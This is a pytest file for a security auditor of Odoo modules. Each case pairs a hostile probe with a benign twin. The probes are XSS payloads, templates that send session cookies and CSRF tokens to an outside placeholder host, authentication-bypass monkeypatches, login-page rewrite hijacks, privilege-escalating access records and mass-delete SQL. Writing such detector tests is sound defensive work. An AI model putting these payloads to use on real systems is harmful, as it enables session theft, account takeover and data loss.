"""BOT-CODE-AUDIT-6: REVIEW-CODE-AUDIT-5 (H1-H17, M1-M6, L1-L3, goal 5) and the
deny-by-default sensitive data policy. Every item: a positive probe, variants, and a benign twin.
"""

# ruff: noqa: E501
import pytest

from tests.test_nf_bot_code_audit_5 import codes, py, pyt  # noqa: F401

L3 = ("sensitive-data-unapproved", "high")


def X(body):
    return {"views/v.xml": "<odoo>\n" + body + "\n</odoo>\n"}


def has(files, code, sev="high"):
    return (code, sev) in codes(files)


# ---------------------------------------------------------------- deny-by-default policy

DENY_XML = {
    "users": "<record id='u' model='res.users'><field name='login'>x</field></record>",
    "config-param": "<record id='p' model='ir.config_parameter'><field name='key'>a.b</field><field name='value'>1</field></record>",
    "mail-server": "<record id='m' model='ir.mail_server'><field name='name'>m</field><field name='smtp_host'>e.v</field></record>",
    "fetchmail": "<record id='f' model='fetchmail.server'><field name='name'>f</field></record>",
    "rewrite": "<record id='r' model='website.rewrite'><field name='name'>r</field><field name='url_from'>/web/login</field><field name='url_to'>https://e.v/login</field></record>",
    "rewrite-local": "<record id='r' model='website.rewrite'><field name='name'>r</field><field name='url_from'>/a</field><field name='url_to'>/b</field></record>",
    "website-code-head": "<record id='w' model='website'><field name='custom_code_head'>&lt;script src='https://e.v/x.js'&gt;&lt;/script&gt;</field></record>",
    "website-code-footer": "<record id='w' model='website'><field name='custom_code_footer'>x</field></record>",
    "access-public-write": "<record id='a' model='ir.model.access'><field name='name'>a</field><field name='model_id' ref='base.model_res_users'/><field name='group_id' ref='base.group_public'/><field name='perm_read' eval='1'/><field name='perm_write' eval='1'/></record>",
    "access-own-public-write": "<record id='a' model='ir.model.access'><field name='name'>a</field><field name='model_id' ref='model_a_a'/><field name='group_id' ref='base.group_portal'/><field name='perm_write' eval='1'/></record>",
    "rule-core": "<record id='r' model='ir.rule'><field name='name'>r</field><field name='model_id' ref='base.model_res_partner'/><field name='domain_force'>[('id','>',0)]</field></record>",
    "group-admin-implied": "<record id='g' model='res.groups'><field name='name'>g</field><field name='implied_ids' eval=\"[(4,ref('base.group_system'))]\"/></record>",
    "group-users": "<record id='g' model='res.groups'><field name='name'>g</field><field name='users' eval=\"[(4,ref('base.user_demo'))]\"/></record>",
    "cron-unlink": "<record id='c' model='ir.cron'><field name='name'>c</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code'>model.search([]).unlink()</field></record>",
    "cron-core-model": "<record id='c' model='ir.cron'><field name='name'>c</field><field name='model_id' ref='base.model_res_partner'/><field name='state'>code</field><field name='code'>model._gc()</field></record>",
    "server-two-lines": "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code'>x = 1\nrecords.action_done()</field></record>",
    "server-multi": "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='model_a_a'/><field name='state'>multi</field><field name='child_ids' eval=\"[(4,ref('base.action_x'))]\"/></record>",
    "loop-write-core-field": "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code'>for rec in records:\n    rec['user_id'] = 1</field></record>",
    "loop-dynamic-value": "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code'>for rec in records:\n    rec['x_a'] = env.user.id</field></record>",
    "automation-foreign-action": "<record id='b' model='base.automation'><field name='name'>b</field><field name='model_id' ref='model_a_a'/><field name='trigger'>on_create</field><field name='action_server_ids' eval=\"[(4, ref('base.action_x'))]\"/></record>",
    "automation": "<record id='b' model='base.automation'><field name='name'>b</field></record>",
    "view-script": "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='model'>a.a</field><field name='arch' type='xml'><form><div><script>alert(1)</script></div></form></field></record>",
    "view-onclick": "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='model'>a.a</field><field name='arch' type='xml'><form><div onclick='x()'/></form></field></record>",
    "view-users-public": "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='model'>res.users</field><field name='inherit_id' ref='base.view_users_form'/><field name='arch' type='xml'><field name='groups_id' position='attributes'><attribute name='groups'>base.group_public</attribute></field></field></record>",
    "act-url-js": "<record id='u' model='ir.actions.act_url'><field name='name'>u</field><field name='url'>javascript:alert(document.cookie)</field></record>",
    "act-url-ext": "<record id='u' model='ir.actions.act_url'><field name='name'>u</field><field name='url'>https://e.v</field></record>",
    "menu-js": "<record id='m' model='website.menu'><field name='name'>m</field><field name='url'>javascript:alert(1)</field></record>",
    "asset-ext": "<record id='a' model='ir.asset'><field name='name'>a</field><field name='bundle'>web.assets_backend</field><field name='path'>https://e.v/x.js</field></record>",
    "asset-foreign": "<record id='a' model='ir.asset'><field name='name'>a</field><field name='bundle'>web.assets_backend</field><field name='path'>web/static/x.js</field></record>",
    "attachment-public": "<record id='a' model='ir.attachment'><field name='name'>a.txt</field><field name='public' eval='True'/><field name='raw'>x</field></record>",
    "field-compute": "<record id='f' model='ir.model.fields'><field name='name'>x_a</field><field name='model_id' ref='model_a_a'/><field name='compute'>for r in self: r['x_a']=1</field></record>",
    "alias-defaults-priv": "<record id='al' model='mail.alias'><field name='alias_name'>a</field><field name='alias_model_id' ref='base.model_res_users'/><field name='alias_defaults'>{'groups_id':[(4,ref('base.group_system'))]}</field></record>",
    "alias-defaults-dynamic": "<record id='al' model='mail.alias'><field name='alias_name'>a</field><field name='alias_model_id' ref='model_a_a'/><field name='alias_defaults'>dict(share=False)</field></record>",
    "default-groups": "<record id='d' model='ir.default'><field name='field_id' ref='base.field_res_users__groups_id'/><field name='json_value'>[1]</field></record>",
    "default-priv-json": "<record id='d' model='ir.default'><field name='field_id' ref='field_a_a__x'/><field name='json_value'>{\"share\": false}</field></record>",
    "report-env": "<record id='r' model='ir.actions.report'><field name='name'>r</field><field name='model'>a.a</field><field name='report_name'>x.r</field><field name='print_report_name'>env['res.users'].search([]).name</field></record>",
    "foreign-group": "<record id='base.group_user' model='res.groups'><field name='name'>g</field></record>",
    "template-script": "<record id='t' model='mail.template'><field name='name'>t</field><field name='model_id' ref='model_a_a'/><field name='body_html'>&lt;script&gt;x&lt;/script&gt;</field></record>",
    "ir-model-data": "<record id='d' model='ir.model.data'><field name='name'>x</field><field name='module'>base</field></record>",
    "module": "<record id='m' model='ir.module.module'><field name='name'>x</field></record>",
    "server-lines": "<record id='l' model='ir.server.object.lines'><field name='col1' ref='base.field_res_users__active'/></record>",
    "company-users": "<record id='co' model='res.company'><field name='name'>c</field><field name='user_ids' eval='[(4,1)]'/></record>",
    "other-model-alias-defaults": "<record id='p' model='project.project'><field name='name'>p</field><field name='alias_defaults'>{'groups_id':[1]}</field></record>",
}

ALLOW_XML = {
    "own-access": "<record id='a' model='ir.model.access'><field name='name'>a</field><field name='model_id' ref='model_a_a'/><field name='group_id' ref='base.group_user'/><field name='perm_read' eval='1'/><field name='perm_write' eval='1'/><field name='perm_create' eval='1'/><field name='perm_unlink' eval='1'/></record>",
    "own-rule": "<record id='r' model='ir.rule'><field name='name'>r</field><field name='model_id' ref='model_a_a'/><field name='domain_force'>[('user_id','=',user.id)]</field></record>",
    "own-group": "<record id='g' model='res.groups'><field name='name'>g</field><field name='implied_ids' eval=\"[(4,ref('base.group_user'))]\"/></record>",
    "own-cron": "<record id='c' model='ir.cron'><field name='name'>c</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code'>model._cron_refresh()</field></record>",
    "own-loop-server": "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' search=\"[('model','=','x_request')]\"/><field name='state'>code</field><field name='code'>for rec in records:\n    rec['x_state'] = 'done'\n    rec.message_post(body='ok')</field></record>",
    "own-automation": "<record id='b' model='base.automation'><field name='name'>b</field><field name='model_id' ref='model_a_a'/><field name='trigger'>on_create</field><field name='action_server_ids' eval=\"[(4, ref('s'))]\"/></record>",
    "own-server": "<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code'>action = records.action_open()</field></record>",
    "inert-view": "<record id='v' model='ir.ui.view'><field name='name'>v</field><field name='model'>a.a</field><field name='arch' type='xml'><form><field name='name'/></form></field></record>",
    "rel-act-url": "<record id='u' model='ir.actions.act_url'><field name='name'>u</field><field name='url'>/web#action=1</field></record>",
    "rel-menu": "<record id='m' model='website.menu'><field name='name'>m</field><field name='url'>/shop</field></record>",
    "own-asset": "<record id='a' model='ir.asset'><field name='name'>a</field><field name='bundle'>web.assets_backend</field><field name='path'>x/static/src/a.js</field></record>",
    "private-attachment": "<record id='a' model='ir.attachment'><field name='name'>a.txt</field><field name='raw'>hello</field></record>",
    "plain-report": "<record id='r' model='ir.actions.report'><field name='name'>r</field><field name='model'>a.a</field><field name='report_name'>x.r</field><field name='print_report_name'>'Doc - %s' % (object.name)</field></record>",
    "plain-template": "<record id='t' model='mail.template'><field name='name'>t</field><field name='model_id' ref='model_a_a'/><field name='body_html'>&lt;p&gt;Hi&lt;/p&gt;</field></record>",
    "plain-alias": "<record id='al' model='mail.alias'><field name='alias_name'>a</field><field name='alias_model_id' ref='model_a_a'/><field name='alias_defaults'>{'priority':'1'}</field></record>",
    "plain-default": "<record id='d' model='ir.default'><field name='field_id' ref='field_a_a__x'/><field name='json_value'>\"draft\"</field></record>",
    "plain-field": "<record id='f' model='ir.model.fields'><field name='name'>x_a</field><field name='model_id' ref='model_a_a'/><field name='ttype'>char</field></record>",
}


@pytest.mark.parametrize("name", sorted(DENY_XML))
def test_policy_denies_xml(name):
    assert L3 in codes(X(DENY_XML[name])), name


@pytest.mark.parametrize("name", sorted(ALLOW_XML))
def test_policy_allows_narrow_shape(name):
    assert L3 not in codes(X(ALLOW_XML[name])), name


def test_policy_csv_same_as_xml():
    deny = "id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\na,a,base.model_res_users,base.group_public,1,1,0,0\n"
    allow = "id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\na,a,model_a_a,base.group_user,1,1,1,1\n"
    assert L3 in codes({"security/ir.model.access.csv": deny})
    assert L3 not in codes({"security/ir.model.access.csv": allow})
    assert L3 in codes({"data/ir.config_parameter.csv": "id,key,value\np,a.b,1\n"})


def test_policy_json_and_yaml_data():
    j = '{"records":[{"model":"ir.mail_server","id":"m","values":{"smtp_host":"e.v"}}]}'
    assert L3 in codes({"data/d.json": j})
    assert L3 in codes({"data/d.yaml": "- model: res.users\n  values:\n    login: x\n"})
    assert L3 in codes({"data/d.yml": "site:\n  custom_code_head: '<script>x</script>'\n"})
    assert L3 not in codes({"data/d.json": '{"model":"x.y","values":{"name":"a"}}'})
    # unparsable data naming a sensitive model fails closed
    assert ("data-unaudited", "high") in codes({"data/d.yaml": "model: res.users\n  : : bad: [\n"})


@pytest.mark.parametrize(
    "body",
    [
        "self.env['ir.config_parameter'].set_param('a','b')",
        "self.env['res.groups'].create({'name':'g'})",
        "self.env['ir.mail_server'].create({'smtp_host':'e.v'})",
        "self.env['website.rewrite'].create({'url_from':'/web/login'})",
        "self.env['ir.ui.view'].write({'arch':'x'})",
        "m = self.env['ir.cron']\nm.create({'name':'c'})",
    ],
)
def test_policy_python_writes_are_high(body):
    assert ("sensitive-model-write", "high") in codes(py(body))


def test_policy_python_reads_are_not_writes():
    assert ("sensitive-model-write", "high") not in codes(py("self.env['ir.config_parameter'].get_param('a')"))


# ---------------------------------------------------------------- H17 mrp t-att-class FP


@pytest.mark.parametrize("expr", ["data['get_color']()", "values['fmt'](line)", "docs['label']()"])
def test_h17_render_value_call_in_template_not_high(expr):
    f = X(f"<template id='t'><span t-att-class=\"{expr}\"/></template>")
    assert ("unsafe-expression", "high") not in codes(f)


@pytest.mark.parametrize(
    "expr",
    ["data['write']({})", "env['res.users']()", "data['__class__']()", "_x['a']()", "(lambda: 1)()", "data[k]()"],
)
def test_h17_variants_still_high(expr):
    f = X(f"<template id='t'><span t-att-class=\"{expr}\"/></template>")
    assert ("unsafe-expression", "high") in codes(f), expr


# ---------------------------------------------------------------- H1-H6 python


@pytest.mark.parametrize(
    "src",
    [
        "class C(http.Controller):\n    @http.route('/a',auth='public')\n    def a(self,**kw):\n        request.env.user.sudo().write({'groups_id':[(4,request.env.ref('base.group_system').id)]})\n",
        "class C(http.Controller):\n    @http.route('/a',auth='none')\n    def a(self):\n        request.env.user.sudo().write({'active': True})\n",
        "class C(http.Controller):\n    @http.route('/a',auth='public')\n    def a(self):\n        request.env.company.sudo().write({'name': 'x'})\n",
    ],
)
def test_h1_public_route_writes_current_user(src):
    assert ("public-sudo-access", "high") in codes(pyt(src))


def test_h1_negative_user_route_read():
    src = "class C(http.Controller):\n    @http.route('/a',auth='user')\n    def a(self):\n        return request.env.user.name\n"
    assert ("public-sudo-access", "high") not in codes(pyt(src))


@pytest.mark.parametrize(
    "line",
    [
        "setattr(Users,'_check_'+'credentials',lambda *a,**k: None)",
        "setattr(Users,''.join(['_check_','credentials']),lambda *a,**k: None)",
        "setattr(Users,'%s' % '_check_credentials',lambda *a,**k: None)",
        "setattr(Users,f'_check_{\"credentials\"}',lambda *a,**k: None)",
    ],
)
def test_h2_folded_setattr(line):
    src = "from odoo.addons.base.models.res_users import Users\n" + line + "\n"
    assert ("auth-override", "high") in codes(pyt(src))


def test_h2_non_literal_setattr_on_odoo_class():
    src = "from odoo.addons.base.models.res_users import Users\nn=input()\nsetattr(Users,n,None)\n"
    assert ("core-patch", "high") in codes(pyt(src))


def test_h2_negative_setattr_on_own_object():
    src = "class K:\n    pass\nk=K()\nsetattr(k,'name','x')\n"
    assert ("core-patch", "high") not in codes(pyt(src))


@pytest.mark.parametrize(
    "src",
    [
        "from odoo import http\nhttp.Request._authenticate_explicit=lambda *a,**k: True\n",
        "import odoo.http as h\nh.Session.authenticate=lambda *a: 1\n",
        "from odoo.http import Request\nRequest.x = 1\n",
        "from odoo.service import security\nsecurity.check_session=lambda *a: True\n",
        "from odoo import http\nsetattr(http.Request,'x',1)\n",
    ],
)
def test_h3_http_internals_patch(src):
    assert ("core-patch", "high") in codes(pyt(src))


@pytest.mark.parametrize("meth", ["_auth_method_user", "_auth_method_public", "_authenticate", "_auth_method_custom"])
def test_h4_ir_http_auth_override(meth):
    src = f"class I(models.AbstractModel):\n    _inherit='ir.http'\n    @classmethod\n    def {meth}(cls):\n        return True\n"
    assert ("auth-override", "high") in codes(pyt(src))


@pytest.mark.parametrize(
    "q",
    ["UPDATE res_users SET active=false", "DELETE FROM res_groups_users_rel", "TRUNCATE ir_rule", "update ir_config_parameter set value=1"],
)
def test_h5_core_dml_anywhere(q):
    src = f"class A(models.Model):\n    _inherit='res.partner'\n    def init(self):\n        self.env.cr.execute('{q}')\n"
    assert ("core-table-dml", "high") in codes(pyt(src))


def test_h5_negative_own_table_dml():
    src = "class A(models.Model):\n    _name='x.y'\n    def init(self):\n        self.env.cr.execute('UPDATE x_y SET a=1')\n"
    assert ("core-table-dml", "high") not in codes(pyt(src))


@pytest.mark.parametrize(
    "src",
    [
        "import asyncio\nasyncio.run(asyncio.create_subprocess_shell('id'))\n",
        "import asyncio\nasyncio.create_subprocess_exec('id')\n",
        "import asyncio\nloop=asyncio.get_event_loop()\nloop.subprocess_shell(None,'id')\n",
        "from asyncio import create_subprocess_shell as c\nc('id')\n",
    ],
)
def test_h6_asyncio_subprocess(src):
    assert ("dangerous-call", "high") in codes(pyt(src))


# ---------------------------------------------------------------- H7 token leak sources
@pytest.mark.parametrize("attr", [
    """t-attf-src='//e.v/{{request.httprequest.cookies.get("session_id")}}'""",
    """t-att-src="'https://e.v/?'+request.csrf_token()" """,
    """t-att-href="'//e.v/?c=' + request.httprequest.cookies['x']" """,
    """t-attf-href='https://e.v/?s={{request.session.sid}}'""",
])
def test_h7_token_leak(attr):
    assert has(X(f"<template id='t'><img {attr}/></template>"), "qweb-token-leak")


def test_h7_local_csrf_ok():
    assert not has(X("""<template id='t'><img t-att-src="'/web/x?'+request.csrf_token()"/></template>"""), "qweb-token-leak")


# ---------------------------------------------------------------- H8 public/portal write on a core model
H8_XML = "<record id='a' model='ir.model.access'><field name='name'>a</field><field name='model_id' ref='base.model_res_users'/><field name='group_id' ref='base.group_{g}'/><field name='perm_{p}' eval='1'/></record>"
H8_CSV = "id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\na,a,{m},base.group_{g},1,{w},0,0\n"


@pytest.mark.parametrize("g", ["public", "portal"])
@pytest.mark.parametrize("p", ["write", "create", "unlink"])
def test_h8_public_core_access_xml(g, p):
    assert L3 in codes(X(H8_XML.format(g=g, p=p)))


@pytest.mark.parametrize("g", ["public", "portal"])
def test_h8_public_core_access_csv(g):
    assert L3 in codes({"security/ir.model.access.csv": H8_CSV.format(m="base.model_res_users", g=g, w=1)})


def test_h8_own_model_user_read_ok():
    f = {"security/ir.model.access.csv": "id,name,model_id:id,group_id:id,perm_read,perm_write,perm_create,perm_unlink\na,a,model_a_a,base.group_user,1,1,1,0\n"}
    assert L3 not in codes(f)


# ---------------------------------------------------------------- H9 ir.mail_server data graded like Python
@pytest.mark.parametrize("host", ["e.v", "localhost", "smtp.gmail.com"])
def test_h9_mail_server_data(host):
    assert L3 in codes(X(f"<record id='m' model='ir.mail_server'><field name='name'>m</field><field name='smtp_host'>{host}</field></record>"))


def test_h9_mail_server_csv_and_python():
    assert L3 in codes({"data/ir.mail_server.csv": "id,name,smtp_host\nm,m,e.v\n"})
    assert ("sensitive-model-write", "high") in codes(py("self.env['ir.mail_server'].create({'name':'m','smtp_host':'e.v'})"))


# ---------------------------------------------------------------- H10 eval-literal server code goes down the code path
H10 = """<record id='s' model='ir.actions.server'><field name='name'>s</field><field name='model_id' ref='model_a_a'/><field name='state'>code</field><field name='code' eval="{e}"/></record>"""


@pytest.mark.parametrize("e", [
    "'env[\\'res.users\\'].search([]).unlink()'",
    '"env[\'res.users\'].search([]).write({\'active\':False})"',
    "'''env.cr.execute(\\'DELETE FROM res_users\\')'''",
])
def test_h10_eval_literal_code(e):
    hi = {k for k, s in codes(X(H10.format(e=e))) if s == "high" and k != "sensitive-data-unapproved"}
    assert hi, hi


def test_h10_eval_literal_benign():
    hi = {k for k, s in codes(X(H10.format(e="'records.action_done()'"))) if s == "high"}
    assert not hi, hi


# ---------------------------------------------------------------- H8 named finding, H11-H13, H16
def test_h8_named_public_core_access():
    assert has(X(H8_XML.format(g="public", p="write")), "public-core-access")
    assert has({"security/ir.model.access.csv": H8_CSV.format(m="base.model_res_partner", g="portal", w=1)}, "public-core-access")
    assert not has({"security/ir.model.access.csv": H8_CSV.format(m="base.model_res_partner", g="portal", w=0)}, "public-core-access")


@pytest.mark.parametrize("k,val", [
    ("custom_code_head", "&lt;script src='https://e.v/x.js'&gt;&lt;/script&gt;"),
    ("custom_code_footer", "&lt;img src=x onerror=alert(1)&gt;"),
    ("custom_code_head", "&lt;iframe src='//e.v'&gt;&lt;/iframe&gt;"),
])
def test_h11_custom_code_markup(k, val):
    assert has(X(f"<record id='w' model='website'><field name='{k}'>{val}</field></record>"), "stored-web-script")


def test_h11_plain_text_not_script():
    assert not has(X("<record id='w' model='website'><field name='custom_code_head'>hello</field></record>"), "stored-web-script")


@pytest.mark.parametrize("f,t", [("/web/login", "/shop"), ("/a", "https://e.v/login"), ("/a", "//e.v/x"), ("/web/signup", "/b")])
def test_h12_rewrite_hijack(f, t):
    assert has(X(f"<record id='r' model='website.rewrite'><field name='name'>r</field><field name='url_from'>{f}</field><field name='url_to'>{t}</field></record>"), "rewrite-hijack")


def test_h12_rewrite_local_ok():
    assert not has(X("<record id='r' model='website.rewrite'><field name='name'>r</field><field name='url_from'>/a</field><field name='url_to'>/b</field></record>"), "rewrite-hijack")


@pytest.mark.parametrize("d", ["{'groups_id':[(4,ref('base.group_system'))]}", "{'share': False}", "{'group_ids': [(6,0,[1])]}"])
def test_h13_alias_privilege(d):
    for m in ("mail.alias", "a.a"):
        assert has(X(f"<record id='al' model='{m}'><field name='alias_name'>x</field><field name='alias_defaults'>{d}</field></record>"), "alias-privilege")


def test_h13_alias_plain_ok():
    assert not has(X("<record id='al' model='mail.alias'><field name='alias_name'>x</field><field name='alias_defaults'>{'priority': '1'}</field></record>"), "alias-privilege")


@pytest.mark.parametrize("m,u", [
    ("ir.actions.act_url", "javascript:alert(document.cookie)"),
    ("ir.actions.act_url", " JavaScript:alert(1)"),
    ("website.menu", "javascript:alert(1)"),
    ("website.menu", "data:text/html,&lt;script&gt;x&lt;/script&gt;"),
])
def test_h16_script_urls(m, u):
    assert has(X(f"<record id='u' model='{m}'><field name='name'>u</field><field name='url'>{u}</field></record>"), "script-url")


def test_h16_relative_url_ok():
    assert not has(X("<record id='u' model='website.menu'><field name='name'>u</field><field name='url'>/shop</field></record>"), "script-url")


# ---------------------------------------------------------------- H14 OWL javascript: href
@pytest.mark.parametrize("a", ["t-att-href=\"'javascript:'+props.c\"", "t-attf-href='javascript:{{props.c}}'", "t-att-href=\"' javascript:' + x\""])
def test_h14_owl_js_href(a):
    assert has({"static/src/a.xml": f"<templates><t t-name='a.A'><a {a}>x</a></t></templates>"}, "qweb-js-url")


def test_h14_owl_relative_href_ok():
    assert not has({"static/src/a.xml": "<templates><t t-name='a.A'><a t-att-href=\"'/shop/'+props.c\">x</a></t></templates>"}, "qweb-js-url")


# ---------------------------------------------------------------- H15 JS mass change
@pytest.mark.parametrize("src", [
    "export async function f(orm){ await orm.unlink('res.partner', await orm.search('res.partner',[])); }",
    "export async function f(orm){ const ids = await this.orm.search('a.a', []); }\nexport async function g(orm){ await orm.write('a.a', await orm.search('a.a', []), {x:1}); }",
    "export async function f(orm){ await orm.call('res.partner','unlink',[await orm.search('res.partner')]); }",
])
def test_h15_js_mass_change(src):
    assert has({"static/src/a.js": src + "\n"}, "js-mass-change")


def test_h15_js_scoped_unlink_ok():
    src = "export async function f(orm){ await orm.unlink('a.a', await orm.search('a.a',[['state','=','draft']])); }\n"
    assert not has({"static/src/a.js": src}, "js-mass-change")


# ---------------------------------------------------------------- M1 LESS @import variable interpolation
@pytest.mark.parametrize("src,code,sev", [
    ("@h:'https://e.v';\n@import url('@{h}/x.css');\n", "css-external-import", "high"),
    ("@h:\"//e.v\";\n@import (css) url(\"@{h}/x.css\");\n", "css-external-import", "high"),
    ("@import url('@{unknown}/x.css');\n", "css-dynamic-url", "medium"),
    ("@import '@{unknown}/x.less';\n", "css-dynamic-url", "medium"),
])
def test_m1_less_import_interp(src, code, sev):
    assert (code, sev) in codes({"static/src/a.less": src})


def test_m1_less_local_import_ok():
    c = codes({"static/src/a.less": "@d:'./parts';\n@import url('@{d}/x.less');\n"})
    assert not {k for k, s in c if k.startswith("css-") and s in ("high", "medium")}, c
